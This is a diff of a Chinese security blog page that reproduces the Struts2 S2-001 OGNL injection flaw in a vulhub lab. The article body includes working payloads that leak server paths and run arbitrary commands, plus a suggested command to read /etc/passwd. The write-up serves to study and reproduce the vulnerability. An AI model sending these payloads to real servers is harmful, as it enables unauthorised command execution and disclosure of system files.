@@ -6,21 +6,26 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返">
+    <meta name="description" content="【研究】Struts2漏洞之S2-001漏洞环境和POC 1.环境 2.原理 3.影响版本 4.利用过程 POC  1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【研究】Struts2漏洞之S2-001漏洞环境和POC">
 <meta property="og:url" content="https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返">
+<meta property="og:description" content="【研究】Struts2漏洞之S2-001漏洞环境和POC 1.环境 2.原理 3.影响版本 4.利用过程 POC  1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My1jZWI3ZjBiOTEzMGYyNGNlLnBuZw">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0wOGRiYjU2OTg3NTk5N2ZkLnBuZw">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xN2EyMDBlODNlOWQzOWIx">
 <meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xOTJhZTdiZTM5NTQwODc1">
 <meta property="article:published_time" content="2019-07-01T03:44:10.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.506Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:07.996Z">
 <meta property="article:author" content="Zeo">
-<meta property="article:tag" content="利用">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My1jZWI3ZjBiOTEzMGYyNGNlLnBuZw">
     
@@ -55,6 +60,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -117,7 +124,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#【研究】Struts2漏洞之S2-001漏洞环境和POC"><span class="toc-number">1.</span> <span class="toc-text">【研究】Struts2漏洞之S2-001漏洞环境和POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number"></span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a>
     </div>
   </span>
 </div>
@@ -150,16 +157,11 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
       
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/%E5%88%A9%E7%94%A8/" rel="tag">利用</a>
-    </div>
-
 
     </div>
   </header>
@@ -169,7 +171,14 @@
     <a id="more"></a>
 
 
-<p>@<a href="【研究】Struts2漏洞之S2-001漏洞环境和POC">TOC</a></p>
+
+<h3 id="【研究】Struts2漏洞之S2-001漏洞环境和POC"><a href="#【研究】Struts2漏洞之S2-001漏洞环境和POC" class="headerlink" title="【研究】Struts2漏洞之S2-001漏洞环境和POC"></a>【研究】Struts2漏洞之S2-001漏洞环境和POC</h3><ul>
+<li><a href="#1_3">1.环境</a></li>
+<li><a href="#2_8">2.原理</a></li>
+<li><a href="#3_19">3.影响版本</a></li>
+<li><a href="#4_23">4.利用过程</a></li>
+<li><a href="#POC_33">POC</a></li>
+</ul>
 <h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p>
 <h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote>
 <p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}<br>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
@@ -179,13 +188,16 @@
 <p>这个漏洞的问题在于可以直接输入和直接回显<br>将POC粘到一个输入框，点击Submit<br>此后会将数据提交到后端，后端检测值是否为空，然后返回，满足漏洞前提</p>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>获取tomcat执行路径：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0wOGRiYjU2OTg3NTk5N2ZkLnBuZw" alt="在这里插入图片描述"><br>获取Web路径：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xN2EyMDBlODNlOWQzOWIx" alt="在这里插入图片描述"><br>执行任意命令（命令参数：<code>pwd</code>）：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xOTJhZTdiZTM5NTQwODc1" alt="在这里插入图片描述"></p>
 <p>命令要自己构造如</p>
-<pre><code>{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;</span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
@@ -214,7 +226,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#【研究】Struts2漏洞之S2-001漏洞环境和POC"><span class="toc-number">1.</span> <span class="toc-text">【研究】Struts2漏洞之S2-001漏洞环境和POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number"></span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number"></span> <span class="toc-text">POC</span></a>
     </div>
 
     <div id="share-footer" style="display: none">
